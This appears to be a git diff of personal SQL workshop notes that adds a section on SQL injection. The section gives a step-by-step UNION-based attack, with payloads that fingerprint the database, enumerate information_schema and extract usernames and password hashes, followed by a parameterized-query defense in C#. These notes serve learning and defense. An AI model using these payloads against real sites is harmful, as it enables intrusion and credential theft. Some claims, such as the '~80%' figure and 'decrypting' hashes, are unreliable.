@@ -1320,7 +1320,7 @@
                     public static DateTime ToDateTime(string s) => DateTime.Parse(s);
                 }
 
-## Notes from workshop: 
+## Notes from 1st SQL workshop: 
 
 - working on `northwind traders` -> PA excercise (Denes used HeidiDQL)
 - SQL: structured query language; the language of relational database operations
@@ -1388,6 +1388,63 @@
         ORM
         Object Relational Mapping
         EntityFramework
+
+## SQL INJECTION:
+- SQL injection attacks ~80% of web is affected (Cybersecurity issue)
+- SQL code gets injected as the parameters (SQL), and because SQL prioritizes code over parameters, it will get executed as code
+- data is the most valuable resource in the world
+
+- How to attack - Softwarestore example:
+    1. is there even a chance, that I can attack?
+        - what is the backend language?
+        - to the input I try to insert ` ot " or ' to get a syntax error
+        - if we get an error repeatedly, it means that the injection works
+    2. Now we look for something partial (to make it use `LIKE` keyword in the background) -> we assume it uses SQL at this point
+        - we can then use -- to comment the rest of the code
+        - we can check again if -- " ot -- ' or -- ` breaks the code -> if it doesn't, then it means our assumption was almost correct
+        - we can use `UNION` keyword to join `SELECT`s -> if the coulmns number matches:
+            
+                ' UNION SELECT 'one', 'two', 'three' -- (keep doing this until you find the correct number of columns)
+        
+        - Now let's check what the SQL dialect is:
+
+                ' UNION SELECT NULL, 'Ver', VERSION() // OR @@VER // OR VER()
+        
+        - We found out we are using postgresql
+
+    3. Let's find out what data there is (eg. Table names)
+
+        - ' UNION SELECT NULL, TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES -- // A database of the info of the databases
+        - we want to look for the public table schemas
+
+        - ' UNION SELECT NULL, COLUMN_NAME, DATA_TYPE FROM information_schema.COLUMNS WHERE TABLE_NAME = 'person' -- // A database of the info of the databases
+    
+    4. Only display what we need:
+        
+        - We add an empty search result to the beginning, eg 'linux': linux ' UNION SELECT NULL...
+
+    5. Now we access the found tables
+        
+        - ' UNION SELECT NULL, CONCAT(name, ':', role), password_hash FROM person --
+    
+    6. We find out the if the hash encryption is MD5 for example
+
+        - linux' UNION SELECT NULL, 'Is MD5?', ('hash' SIMILAR TO '[0-9a-f]{32}')::TEXT -- -> if returns true, it is likely MD5
+    
+    7. now we can google online decrypter for the hasher type, an there we have our password
+
+- How to defend:
+    - use parameterized inputs:
+        
+            :name   // we use this in the query (: is general, @ symbol is for C# specifically)
+
+            string nameWithWildcards = "%" + name + "%";
+            adapter.SelectCommand?.Parameters.AddWithValue(":name", nameWithWildcards);
+
+            // Or depending on the context:
+            command.Parameters.AddWithValue(":name", nameWithWildcards);
+
+
 
 ## PSQL-PGADMIN PROCESS:
 1. **SQL Shell (psql):**
